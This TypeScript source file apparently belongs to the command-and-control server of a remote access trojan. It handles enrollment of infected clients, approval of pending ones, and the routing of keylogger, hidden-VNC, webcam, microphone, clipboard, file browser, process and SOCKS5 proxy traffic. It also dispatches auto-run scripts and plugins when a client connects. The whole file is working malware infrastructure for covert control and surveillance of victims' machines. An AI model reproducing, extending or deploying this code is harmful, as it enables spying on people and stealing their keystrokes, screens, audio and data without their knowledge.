import type { ServerWebSocket } from "bun";
import { v4 as uuidv4 } from "uuid";
import geoip from "geoip-lite";
import { logAudit, AuditAction } from "../../auditLog";
import * as clientManager from "../../clientManager";
import { clientExists, setOnlineState, upsertClientRow, getClientEnrollmentStatus, setClientEnrollmentStatus, lookupClientByPublicKey, getClientPublicKeyById } from "../../db";
import { logger } from "../../logger";
import { metrics } from "../../metrics";
import { decodeMessage, encodeMessage, type WireMessage } from "../../protocol";
import * as sessionManager from "../../sessions/sessionManager";
import type { SocketData } from "../../sessions/types";
import type { ClientInfo } from "../../types";
import { clearClientSyncState, handleFrame, handleHello, handlePing, handlePong } from "../../wsHandlers";
import { getMaxPayloadLimit, getMessageByteLength, isAllowedClientMessageType } from "../../wsValidation";
import { stopAllProxiesForClient } from "../socks5-proxy-manager";

type PendingScript = {
  timeout: ReturnType<typeof setTimeout>;
  resolve: (value: { ok?: boolean; result?: string; error?: string }) => void;
};

type PendingCommandReply = {
  timeout: ReturnType<typeof setTimeout>;
  resolve: (value: { ok: boolean; message?: string }) => void;
};

type WsLifecycleDeps = {
  maxClientPayloadBytes: number;
  maxViewerPayloadBytes: number;
  pendingScripts: Map<string, PendingScript>;
  pendingCommandReplies: Map<string, PendingCommandReply>;
  rdStreamingState: Map<string, unknown>;
  hvncStreamingState: Map<string, unknown>;
  webcamStreamingState: Map<string, unknown>;
  getNotificationConfig: () => { keywords?: string[]; minIntervalMs?: number; clipboardEnabled?: boolean };
  handleDashboardViewerOpen: (ws: ServerWebSocket<SocketData>) => void;
  handleConsoleViewerOpen: (ws: ServerWebSocket<SocketData>) => void;
  handleRemoteDesktopViewerOpen: (ws: ServerWebSocket<SocketData>) => void;
  handleWebcamViewerOpen: (ws: ServerWebSocket<SocketData>) => void;
  handleHVNCViewerOpen: (ws: ServerWebSocket<SocketData>) => void;
  handleFileBrowserViewerOpen: (ws: ServerWebSocket<SocketData>) => void;
  handleProcessViewerOpen: (ws: ServerWebSocket<SocketData>) => void;
  handleKeyloggerViewerOpen: (ws: ServerWebSocket<SocketData>) => void;
  handleVoiceViewerOpen: (ws: ServerWebSocket<SocketData>) => void;
  handleNotificationViewerOpen: (ws: ServerWebSocket<SocketData>) => void;
  handleConsoleViewerMessage: (ws: ServerWebSocket<SocketData>, raw: string | ArrayBuffer | Uint8Array) => void;
  handleRemoteDesktopViewerMessage: (ws: ServerWebSocket<SocketData>, raw: string | ArrayBuffer | Uint8Array) => void;
  handleWebcamViewerMessage: (ws: ServerWebSocket<SocketData>, raw: string | ArrayBuffer | Uint8Array) => void;
  handleHVNCViewerMessage: (ws: ServerWebSocket<SocketData>, raw: string | ArrayBuffer | Uint8Array) => void;
  handleFileBrowserViewerMessage: (ws: ServerWebSocket<SocketData>, raw: string | ArrayBuffer | Uint8Array) => void;
  handleProcessViewerMessage: (ws: ServerWebSocket<SocketData>, raw: string | ArrayBuffer | Uint8Array) => void;
  handleKeyloggerViewerMessage: (ws: ServerWebSocket<SocketData>, raw: string | ArrayBuffer | Uint8Array) => void;
  handleVoiceViewerMessage: (ws: ServerWebSocket<SocketData>, raw: string | ArrayBuffer | Uint8Array) => void;
  dispatchAutoScriptsForConnection: (info: ClientInfo, ws: ServerWebSocket<SocketData>) => void;
  dispatchAutoLoadPlugins: (info: ClientInfo) => void;
  takePendingNotificationScreenshot: (clientId: string) => any;
  storeNotificationScreenshot: (
    pending: any,
    bytes: Uint8Array,
    format: string,
    width?: number,
    height?: number,
  ) => void;
  handleNotificationScreenshotResult: (clientId: string, payload: any) => void;
  handleConsoleOutput: (payload: any) => void;
  handleFileBrowserMessage: (clientId: string, payload: any) => void;
  handleProxyTunnelData: (clientId: string, connectionId: string, data: Uint8Array) => void;
  handleProxyTunnelClose: (clientId: string, connectionId: string) => void;
  handleProxyConnectResult: (clientId: string, connectionId: string, ok: boolean) => void;
  handleProcessMessage: (clientId: string, payload: any) => void;
  handleKeyloggerMessage: (clientId: string, payload: any) => void;
  notifyRdInputLatency: (commandId: string) => void;
  handleNotificationScreenshotFailure: (commandId: string | undefined, ok: boolean | undefined, message: string | undefined) => void;
  handlePluginEvent: (clientId: string, payload: any) => void;
  handleNotification: (clientId: string, payload: any) => void;
  handleVoiceUplink: (clientId: string, payload: any) => void;
  handleWebcamDevices: (clientId: string, payload: any) => void;
  handleHVNCCloneProgress: (clientId: string, payload: any) => void;
  handleHVNCLookupResult: (clientId: string, payload: any) => void;
  handleClipboardContent: (clientId: string, payload: any) => void;
  cleanupVoiceViewer: (ws: ServerWebSocket<SocketData>) => void;
  stopConsoleOnTarget: (target: ClientInfo | undefined, sessionId: string) => void;
  sendDesktopCommand: (target: ClientInfo | undefined, commandType: string, payload: Record<string, unknown>) => void;
  sendHVNCCommand: (target: ClientInfo, commandType: string, payload: Record<string, unknown>) => void;
  notifyConsoleClosed: (clientId: string, reason: string) => void;
  clearPendingNotificationScreenshots: (clientId: string) => void;
  notifyRemoteDesktopStatus: (clientId: string, status: string, reason?: string) => void;
  handleBuildTagConnection: (clientId: string, buildTag: string) => void;
  notifyDashboard: () => void;
  notifyDashboardClientEvent: (
    event: "client_online" | "client_offline" | "client_purgatory",
    info: { id: string; host?: string; user?: string; os?: string; ip?: string; country?: string },
  ) => void;
  broadcastClientEvent: (
    event: "client_online" | "client_offline" | "client_purgatory",
    info: { id: string; host?: string; user?: string; os?: string; ip?: string; country?: string },
  ) => void;
};

const ENROLLMENT_TIMEOUT_MS = 30_000;
const enrollmentTimeouts = new Map<string, ReturnType<typeof setTimeout>>();

function clearEnrollmentTimeout(clientId: string) {
  const t = enrollmentTimeouts.get(clientId);
  if (t) {
    clearTimeout(t);
    enrollmentTimeouts.delete(clientId);
  }
}

async function verifyEd25519(publicKeyBase64: string, signatureBase64: string, nonceBase64: string): Promise<boolean> {
  try {
    const pubKeyBytes = Buffer.from(publicKeyBase64, "base64");
    const sigBytes = Buffer.from(signatureBase64, "base64");
    const nonceBytes = Buffer.from(nonceBase64, "base64");
    if (pubKeyBytes.length !== 32 || sigBytes.length !== 64) return false;
    const key = await crypto.subtle.importKey(
      "raw",
      pubKeyBytes,
      { name: "Ed25519" },
      false,
      ["verify"],
    );
    return await crypto.subtle.verify("Ed25519", key, sigBytes, nonceBytes);
  } catch {
    return false;
  }
}

function computeKeyFingerprint(publicKeyBase64: string): string {
  const bytes = Buffer.from(publicKeyBase64, "base64");
  const hash = new Bun.CryptoHasher("sha256").update(bytes).digest("hex");
  return hash;
}

export function handleWebSocketOpen(ws: ServerWebSocket<SocketData>, deps: WsLifecycleDeps): void {
  const role = ws.data.role as string;
  const clientId = ws.data.clientId;
  const ip = ws.data.ip;
  if (role === "dashboard_viewer") return deps.handleDashboardViewerOpen(ws);
  if (role === "console_viewer") return deps.handleConsoleViewerOpen(ws);
  if (role === "rd_viewer") return deps.handleRemoteDesktopViewerOpen(ws);
  if (role === "webcam_viewer") return deps.handleWebcamViewerOpen(ws);
  if (role === "hvnc_viewer") return deps.handleHVNCViewerOpen(ws);
  if (role === "file_browser_viewer") return deps.handleFileBrowserViewerOpen(ws);
  if (role === "process_viewer") return deps.handleProcessViewerOpen(ws);
  if (role === "keylogger_viewer") return deps.handleKeyloggerViewerOpen(ws);
  if (role === "voice_viewer") return deps.handleVoiceViewerOpen(ws);
  if (role === "notifications_viewer") return deps.handleNotificationViewerOpen(ws);

  const id = clientId || uuidv4();
  ws.data.clientId = id;
  ws.data.ip = ip;

  const nonceBytes = new Uint8Array(32);
  crypto.getRandomValues(nonceBytes);
  const nonceBase64 = Buffer.from(nonceBytes).toString("base64");
  ws.data.enrollmentNonce = nonceBase64;

  ws.send(encodeMessage({ type: "enrollment_challenge", nonce: nonceBase64 }));

  const timeout = setTimeout(() => {
    enrollmentTimeouts.delete(id);
    try {
      ws.close(4002, "enrollment_timeout");
    } catch {}
  }, ENROLLMENT_TIMEOUT_MS);
  enrollmentTimeouts.set(id, timeout);

  logger.info(`[open] ${id} role=${role} — purgatory challenge sent`);
}

export async function handleWebSocketMessage(
  ws: ServerWebSocket<SocketData>,
  message: string | ArrayBuffer | Uint8Array,
  deps: WsLifecycleDeps,
): Promise<void> {
  const size = getMessageByteLength(message as any);
  const role = ws.data?.role as any;
  const limit = getMaxPayloadLimit(role, deps.maxClientPayloadBytes, deps.maxViewerPayloadBytes);
  if (size > limit) {
    logger.warn(`[ws] closing socket due to oversized message (${size} > ${limit}) role=${role || "unknown"}`);
    try {
      ws.close(1009, "Message too large");
    } catch {}
    return;
  }

  const socketRole = ws.data.role as string;
  if (socketRole === "console_viewer") return deps.handleConsoleViewerMessage(ws, message);
  if (socketRole === "rd_viewer") return deps.handleRemoteDesktopViewerMessage(ws, message);
  if (socketRole === "webcam_viewer") return deps.handleWebcamViewerMessage(ws, message);
  if (socketRole === "hvnc_viewer") return deps.handleHVNCViewerMessage(ws, message);
  if (socketRole === "file_browser_viewer") return deps.handleFileBrowserViewerMessage(ws, message);
  if (socketRole === "process_viewer") return deps.handleProcessViewerMessage(ws, message);
  if (socketRole === "keylogger_viewer") return deps.handleKeyloggerViewerMessage(ws, message);
  if (socketRole === "voice_viewer") return deps.handleVoiceViewerMessage(ws, message);
  if (socketRole === "notifications_viewer") return;
  if (socketRole === "dashboard_viewer") return;

  const { clientId, ip } = ws.data;

  let payload: WireMessage;
  try {
    payload = decodeMessage(message as Uint8Array) as WireMessage;
    if (!payload || typeof (payload as any).type !== "string") {
      return;
    }
  } catch (err) {
    logger.error("[message] decode error", err);
    return;
  }

  const payloadType = (payload as any).type as string;

  if (!isAllowedClientMessageType(payloadType)) {
    logger.warn(`[message] Dropping unknown client message type: ${payloadType}`);
    return;
  }

  const info = clientManager.getClient(clientId);

  if (!info && payloadType !== "hello") return;
  if (info) info.lastSeen = Date.now();

  const client = info!;

  try {
    switch (payloadType) {
      case "hello": {
        clearEnrollmentTimeout(clientId);

        const publicKey = typeof (payload as any).publicKey === "string" ? (payload as any).publicKey : "";
        const signature = typeof (payload as any).signature === "string" ? (payload as any).signature : "";
        const nonce = ws.data.enrollmentNonce || "";

        if (!publicKey || !signature || !nonce) {
          logger.warn(`[purgatory] missing publicKey/signature/nonce for ${clientId}`);
          try { ws.close(4002, "invalid_signature"); } catch {}
          return;
        }

        const valid = await verifyEd25519(publicKey, signature, nonce);
        if (!valid) {
          logger.warn(`[purgatory] invalid signature for ${clientId}`);
          try { ws.close(4002, "invalid_signature"); } catch {}
          return;
        }

        ws.data.enrollmentNonce = undefined;

        const keyFingerprint = computeKeyFingerprint(publicKey);

        const existing = lookupClientByPublicKey(publicKey);
        let enrollmentStatus: string;

        if (existing) {
          enrollmentStatus = existing.enrollmentStatus;
          ws.data.clientId = existing.id;
        } else {
          enrollmentStatus = "pending";

          const existingPk = getClientPublicKeyById(ws.data.clientId);
          if (existingPk && existingPk !== publicKey) {
            ws.data.clientId = keyFingerprint;
            logger.info(`[purgatory] ID collision detected — reassigned to ${keyFingerprint}`);
          }
        }

        const resolvedId = ws.data.clientId;

        if (enrollmentStatus === "denied") {
          logger.info(`[purgatory] denied client ${resolvedId} tried to connect`);
          ws.send(encodeMessage({ type: "enrollment_status", status: "denied" }));
          try { ws.close(4003, "denied"); } catch {}
          return;
        }

        if (enrollmentStatus === "pending") {
          const geo = ip ? geoip.lookup(ip) : undefined;
          const countryRaw = geo?.country || (payload as any).country || "ZZ";
          const country = /^[A-Z]{2}$/i.test(countryRaw) ? countryRaw.toUpperCase() : "ZZ";

          upsertClientRow({
            id: resolvedId,
            hwid: (payload as any).hwid || resolvedId,
            role: "client",
            ip: ip || undefined,
            host: (payload as any).host || undefined,
            os: (payload as any).os || undefined,
            arch: (payload as any).arch || undefined,
            version: (payload as any).version || undefined,
            user: (payload as any).user || undefined,
            monitors: (payload as any).monitors || undefined,
            country,
            lastSeen: Date.now(),
            online: 0 as any,
            publicKey,
            keyFingerprint,
            enrollmentStatus: "pending",
          });

          logger.info(`[purgatory] client ${resolvedId} is pending approval`);
          ws.send(encodeMessage({ type: "enrollment_status", status: "pending" }));
          deps.notifyDashboard();
          deps.notifyDashboardClientEvent("client_purgatory", {
            id: resolvedId,
            host: (payload as any).host || undefined,
            user: (payload as any).user || undefined,
            os: (payload as any).os || undefined,
            ip: ip || undefined,
            country,
          });
          deps.broadcastClientEvent("client_purgatory", {
            id: resolvedId,
            host: (payload as any).host || undefined,
            user: (payload as any).user || undefined,
            os: (payload as any).os || undefined,
            ip: ip || undefined,
            country,
          });
          try { ws.close(4001, "pending"); } catch {}
          return;
        }

        const existingClient = clientManager.getClient(resolvedId);
        if (existingClient?.ws && existingClient.ws !== ws) {
          logger.info(`[purgatory] kicking existing socket for ${resolvedId} (superseded)`);
          try { existingClient.ws.close(4004, "superseded"); } catch {}
          clientManager.deleteClient(resolvedId);
        }

        ws.data.wasKnown = clientExists(resolvedId);

        const infoObj: ClientInfo = {
          id: resolvedId,
          role: "client",
          ws,
          lastSeen: Date.now(),
          country: "",
          ip,
          online: true,
          publicKey,
          keyFingerprint,
          enrollmentStatus: "approved" as any,
        };
        clientManager.addClient(resolvedId, infoObj);

        upsertClientRow({
          id: resolvedId,
          publicKey,
          keyFingerprint,
          enrollmentStatus: "approved",
          online: 1 as any,
          lastSeen: Date.now(),
        });

        const notificationConfig = deps.getNotificationConfig();
        ws.send(
          encodeMessage({
            type: "hello_ack",
            id: resolvedId,
            notification: {
              keywords: notificationConfig.keywords || [],
              minIntervalMs: notificationConfig.minIntervalMs || 8000,
              clipboardEnabled: notificationConfig.clipboardEnabled || false,
            },
          }),
        );

        handleHello(infoObj, payload, ws, ip);
        clientManager.addClient(infoObj.id, infoObj);

        deps.dispatchAutoScriptsForConnection(infoObj, ws);
        deps.dispatchAutoLoadPlugins(infoObj);
        deps.notifyDashboard();
        deps.notifyDashboardClientEvent("client_online", {
            id: infoObj.id,
            host: infoObj.host,
            user: infoObj.user,
            os: infoObj.os,
            ip: infoObj.ip,
            country: infoObj.country,
          });
        deps.broadcastClientEvent("client_online", {
            id: infoObj.id,
            host: infoObj.host,
            user: infoObj.user,
            os: infoObj.os,
            ip: infoObj.ip,
            country: infoObj.country,
          });
        if (infoObj.role === "client") {
          deps.notifyRemoteDesktopStatus(resolvedId, "online");
          metrics.recordConnection();

          const wasKnown = Boolean(ws.data.wasKnown);
          logAudit({
            timestamp: Date.now(),
            username: "system",
            ip: ws.data?.ip || ip || "unknown",
            action: wasKnown ? AuditAction.CLIENT_RECONNECT : AuditAction.CLIENT_FIRST_CONNECT,
            targetClientId: infoObj.id,
            success: true,
            details: JSON.stringify({ host: infoObj.host, os: infoObj.os, user: infoObj.user }),
          });
          (ws as any).data.wasKnown = true;

          const buildTag = typeof (payload as any).buildTag === "string" ? (payload as any).buildTag : "";
          if (buildTag) {
            deps.handleBuildTagConnection(infoObj.id, buildTag);
          }
        }
        break;
      }
      case "ping":
        handlePing(client, payload, ws);
        break;
      case "pong":
        handlePong(client, payload);
        deps.notifyDashboard();
        break;
      case "frame":
        if ((payload as any)?.header?.fps === 0) {
          const pending = deps.takePendingNotificationScreenshot(client.id);
          if (pending) {
            let bytes: Uint8Array | null = null;
            if ((payload as any).data instanceof Uint8Array) {
              bytes = (payload as any).data;
            } else if ((payload as any).data instanceof ArrayBuffer) {
              bytes = new Uint8Array((payload as any).data);
            } else if (ArrayBuffer.isView((payload as any).data)) {
              bytes = new Uint8Array((payload as any).data.buffer);
            }

            const format = String((payload as any)?.header?.format || "jpeg");
            const width = Number((payload as any)?.header?.width) || undefined;
            const height = Number((payload as any)?.header?.height) || undefined;
            if (bytes) {
              deps.storeNotificationScreenshot(pending, bytes, format, width, height);
            }
          }
        }
        handleFrame(client, payload);
        break;
      case "screenshot_result":
        deps.handleNotificationScreenshotResult(client.id, payload);
        break;
      case "console_output":
        deps.handleConsoleOutput(payload);
        break;
      case "file_list_result":
      case "file_download":
      case "file_upload_result":
      case "file_read_result":
      case "file_search_result":
      case "command_result":
        if (payloadType === "command_result" && typeof (payload as any).commandId === "string") {
          const pending = deps.pendingCommandReplies.get((payload as any).commandId);
          if (pending) {
            clearTimeout(pending.timeout);
            pending.resolve({
              ok: Boolean((payload as any).ok),
              message: typeof (payload as any).message === "string" ? (payload as any).message : "",
            });
            deps.pendingCommandReplies.delete((payload as any).commandId);
          }
        }
        if (typeof (payload as any).commandId === "string") {
          deps.notifyRdInputLatency((payload as any).commandId);
        }
        deps.handleNotificationScreenshotFailure(
          (payload as any).commandId,
          (payload as any).ok,
          (payload as any).message,
        );
        deps.handleFileBrowserMessage(client.id, payload);
        if (payloadType === "command_result" && typeof (payload as any).commandId === "string") {
          deps.handleProxyConnectResult(
            client.id,
            (payload as any).commandId,
            Boolean((payload as any).ok),
          );
        }
        break;
      case "command_progress":
        deps.handleFileBrowserMessage(client.id, payload);
        break;
      case "process_list_result":
        deps.handleProcessMessage(client.id, payload);
        break;
      case "keylog_file_list":
      case "keylog_file_content":
      case "keylog_clear_result":
      case "keylog_delete_result":
        deps.handleKeyloggerMessage(client.id, payload);
        break;
      case "script_result": {
        logger.debug(
          `[script] client=${client.id} ok=${(payload as any).ok} output_length=${(payload as any).output?.length || 0}`,
        );
        const cmdId = (payload as any).commandId;
        if (cmdId && deps.pendingScripts.has(cmdId)) {
          const pending = deps.pendingScripts.get(cmdId)!;
          clearTimeout(pending.timeout);
          pending.resolve({
            ok: (payload as any).ok,
            result: (payload as any).output || "",
            error: (payload as any).error,
          });
          deps.pendingScripts.delete(cmdId);
        }
        break;
      }
      case "plugin_event":
        deps.handlePluginEvent(client.id, payload);
        break;
      case "notification":
        deps.handleNotification(client.id, payload);
        break;
      case "voice_uplink":
        deps.handleVoiceUplink(client.id, payload);
        break;
      case "webcam_devices":
        deps.handleWebcamDevices(client.id, payload);
        break;
      case "hvnc_clone_progress":
        deps.handleHVNCCloneProgress(client.id, payload);
        break;
      case "hvnc_lookup_result":
        deps.handleHVNCLookupResult(client.id, payload);
        break;
      case "clipboard_content":
        deps.handleClipboardContent(client.id, payload);
        break;
      case "proxy_data": {
        const connId = (payload as any).connectionId;
        const tunnelData = (payload as any).data;
        if (typeof connId === "string" && tunnelData) {
          const bytes = tunnelData instanceof Uint8Array ? tunnelData : new Uint8Array(tunnelData);
          deps.handleProxyTunnelData(client.id, connId, bytes);
        }
        break;
      }
      case "proxy_close": {
        const connId = (payload as any).connectionId;
        if (typeof connId === "string") {
          deps.handleProxyTunnelClose(client.id, connId);
        }
        break;
      }
      default:
        break;
    }
  } catch (err) {
    logger.error("[message] decode error", err);
  }
}

export function handleWebSocketClose(
  ws: ServerWebSocket<SocketData>,
  code: number,
  reason: unknown,
  deps: WsLifecycleDeps,
): void {
  const clientId = ws.data.clientId;
  const role = ws.data.role as string;
  const sessionId = ws.data.sessionId;

  clearEnrollmentTimeout(clientId);

  if (role === "console_viewer") {
    if (sessionId) {
      sessionManager.deleteConsoleSession(sessionId);
      const target = clientManager.getClient(clientId);
      deps.stopConsoleOnTarget(target, sessionId);
    }
    return;
  }

  if (role === "rd_viewer") {
    let removedClientId = clientId;
    for (const [sid, sess] of sessionManager.getAllRdSessions().entries()) {
      if (sess.viewer === ws) {
        removedClientId = sess.clientId;
        sessionManager.deleteRdSession(sid);
        break;
      }
    }

    const stillViewing = sessionManager.hasRdSessionsForClient(removedClientId);
    if (!stillViewing) {
      const target = clientManager.getClient(removedClientId);
      deps.sendDesktopCommand(target, "desktop_stop", {});
      deps.rdStreamingState.delete(removedClientId);
      logger.debug(`[rd] cleaned up state for client ${removedClientId}`);
    }
    return;
  }

  if (role === "webcam_viewer") {
    let removedClientId = clientId;
    for (const [sid, sess] of sessionManager.getAllWebcamSessions().entries()) {
      if (sess.viewer === ws) {
        removedClientId = sess.clientId;
        sessionManager.deleteWebcamSession(sid);
        break;
      }
    }

    const stillViewing = sessionManager.hasWebcamSessionsForClient(removedClientId);
    if (!stillViewing) {
      const target = clientManager.getClient(removedClientId);
      deps.sendDesktopCommand(target, "webcam_stop", {});
      deps.webcamStreamingState.delete(removedClientId);
      logger.debug(`[webcam] cleaned up state for client ${removedClientId}`);
    }
    return;
  }

  if (role === "hvnc_viewer") {
    let removedClientId = clientId;
    for (const [sid, sess] of sessionManager.getAllHvncSessions().entries()) {
      if (sess.viewer === ws) {
        removedClientId = sess.clientId;
        sessionManager.deleteHvncSession(sid);
        break;
      }
    }

    const stillViewing = sessionManager.hasHvncSessionsForClient(removedClientId);
    if (!stillViewing) {
      const target = clientManager.getClient(removedClientId);
      if (target) {
        deps.sendHVNCCommand(target, "hvnc_stop", {});
      }
      deps.hvncStreamingState.delete(removedClientId);
      logger.debug(`[hvnc] cleaned up state for client ${removedClientId}`);
    }
    return;
  }

  if (role === "file_browser_viewer") {
    if (sessionId) {
      sessionManager.deleteFileBrowserSession(sessionId);
    }
    return;
  }

  if (role === "process_viewer") {
    if (sessionId) {
      sessionManager.deleteProcessSession(sessionId);
    }
    return;
  }

  if (role === "keylogger_viewer") {
    if (sessionId) {
      sessionManager.deleteKeyloggerSession(sessionId);
    }
    return;
  }

  if (role === "voice_viewer") {
    deps.cleanupVoiceViewer(ws);
    return;
  }

  if (role === "notifications_viewer") {
    if (sessionId) {
      sessionManager.deleteNotificationSession(sessionId);
    }
    return;
  }

  if (role === "dashboard_viewer") {
    sessionManager.deleteDashboardSession(ws.data.sessionId || clientId);
    return;
  }

  const currentClient = clientManager.getClient(clientId);
  if (currentClient && currentClient.ws !== ws) {
    logger.info(`[close] ${clientId} code=${code} (superseded socket, skipping cleanup)`);
    return;
  }

  if (role === "client" && currentClient) {
    deps.notifyDashboardClientEvent("client_offline", {
      id: clientId,
      host: currentClient.host,
      user: currentClient.user,
      os: currentClient.os,
      ip: currentClient.ip,
      country: currentClient.country,
    });
    deps.broadcastClientEvent("client_offline", {
      id: clientId,
      host: currentClient.host,
      user: currentClient.user,
      os: currentClient.os,
      ip: currentClient.ip,
      country: currentClient.country,
    });
  }

  clientManager.deleteClient(clientId);
  stopAllProxiesForClient(clientId);
  clearClientSyncState(clientId);
  deps.notifyConsoleClosed(clientId, "Client disconnected");
  setOnlineState(clientId, false);
  deps.clearPendingNotificationScreenshots(clientId);
  deps.notifyDashboard();
  logger.info(`[close] ${clientId} code=${code} reason=${reason}`);

  if (role === "client") {
    deps.notifyRemoteDesktopStatus(clientId, "offline", "Client disconnected");
    metrics.recordDisconnection();
    logAudit({
      timestamp: Date.now(),
      username: "system",
      ip: ws.data?.ip || "unknown",
      action: AuditAction.CLIENT_DISCONNECT,
      targetClientId: clientId,
      success: true,
      details: JSON.stringify({ code, reason: String(reason || "") }),
    });
  }
}
